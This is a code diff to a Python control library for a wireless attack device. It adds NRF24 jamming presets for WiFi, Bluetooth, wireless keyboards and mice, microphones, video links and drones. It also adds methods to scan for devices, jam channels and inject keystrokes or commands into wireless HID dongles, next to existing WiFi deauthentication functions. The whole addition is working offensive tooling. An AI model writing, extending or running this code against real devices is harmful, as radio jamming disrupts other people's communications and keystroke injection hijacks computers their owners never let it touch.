@@ -48,6 +48,24 @@ def _kv_from_resp(resp) -> dict:
     return info
 
 
+# NRF24 jam band presets — each maps to an `nrf jam_sweep start stop step dwell
+# noise` range. Channels are NRF24 1-MHz channels (2400 + ch MHz). Ranges mirror
+# the firmware's modal nrf_jammer() channel groups where they're arithmetic.
+NRF_JAM_PRESETS = {
+    "wifi":    {"range": (2, 77, 5, 40, 0),  "desc": "2.4GHz WiFi (ch1-13 centres)"},
+    "bt":      {"range": (2, 80, 1, 25, 0),  "desc": "Bluetooth classic band"},
+    "ble":     {"range": (2, 80, 1, 25, 0),  "desc": "BLE data + adv band"},
+    "ble_adv": {"range": (1, 81, 2, 30, 0),  "desc": "BLE advertising-ish (ch 37/38/39 area)"},
+    "hid":     {"range": (2, 83, 1, 25, 0),  "desc": "wireless HID dongles (mouse/kbd)"},
+    "mic":     {"range": (0, 83, 1, 25, 0),  "desc": "2.4GHz wireless mics"},
+    "usb":     {"range": (40, 60, 10, 40, 0), "desc": "wireless USB"},
+    "video":   {"range": (70, 80, 5, 40, 0), "desc": "2.4GHz video/FPV"},
+    "rc":      {"range": (1, 7, 2, 40, 0),   "desc": "RC toys / drones (low band)"},
+    "full":    {"range": (0, 125, 1, 15, 0), "desc": "entire 2.4GHz band"},
+    "hopping": {"range": (0, 125, 3, 12, 0), "desc": "fast channel-hop the whole band"},
+}
+
+
 @dataclass
 class Frame:
     type: str       # one of KNOWN_TYPES, or "RAW" for non-frame passthrough lines
@@ -234,6 +252,42 @@ class Companion:
         cap["local"] = got.get("path") or local_path
         cap["verified"] = bool(cap["sha256"]) and got.get("sha256", "") == cap["sha256"]
         return cap
+
+    # --- NRF24 scan / jam / hijack --------------------------------------------
+    def nrf_scan(self, ms=4000):
+        """Scan for NRF24 devices (`nrf scan`). Returns [{ch, addr, hits}] sorted
+        by hit count."""
+        import re
+        r = self.request(f"nrf scan {int(ms)}", timeout=ms / 1000.0 + 10)
+        devs = []
+        for ln in r.lines:
+            m = re.search(r"CH\s*(\d+)\s+([0-9A-Fa-f]{10})\s+hits=(\d+)", ln)
+            if m:
+                devs.append({"ch": int(m.group(1)), "addr": m.group(2).upper(),
+                             "hits": int(m.group(3))})
+        return sorted(devs, key=lambda d: d["hits"], reverse=True)
+
+    def nrf_jam_sweep(self, start=1, stop=80, step=2, dwell=60, noise=0, timeout=12.0):
+        """Sweep-jam a channel range (`nrf jam_sweep`). Device runs ~3s/sweep."""
+        return self.request(f"nrf jam_sweep {start} {stop} {step} {dwell} {noise}", timeout=timeout)
+
+    def nrf_jam_preset(self, name, timeout=12.0):
+        """Sweep-jam a named band preset (see NRF_JAM_PRESETS)."""
+        p = NRF_JAM_PRESETS.get(name)
+        if not p:
+            raise ValueError(f"unknown jam preset {name!r}; have: {', '.join(NRF_JAM_PRESETS)}")
+        s, e, st, dw, n = p["range"]
+        return self.nrf_jam_sweep(s, e, st, dw, n, timeout=timeout)
+
+    def nrf_jam_channel(self, ch, secs=3, timeout=12.0):
+        """Constant-carrier jam one channel for `secs` (via `nrf hijack .. jam`)."""
+        return self.request(f"nrf hijack 0000000000 {ch} jam {secs}", timeout=secs + 8)
+
+    def nrf_hijack(self, addr, ch, action="calc", arg="", proto="logi", timeout=20.0):
+        """HID inject against an NRF24 dongle. action: type|run|calc|cmd|jam.
+        `arg` is a single token (text for type, command for run, seconds for jam)."""
+        a = arg if arg else "x"
+        return self.request(f"nrf hijack {addr} {ch} {action} {a} {proto}", timeout=timeout)
 
     # --- WiFi handshake attack primitives -------------------------------------
     def deauth(self, bssid, sta="broadcast", ch=0, count=8, timeout=8.0):
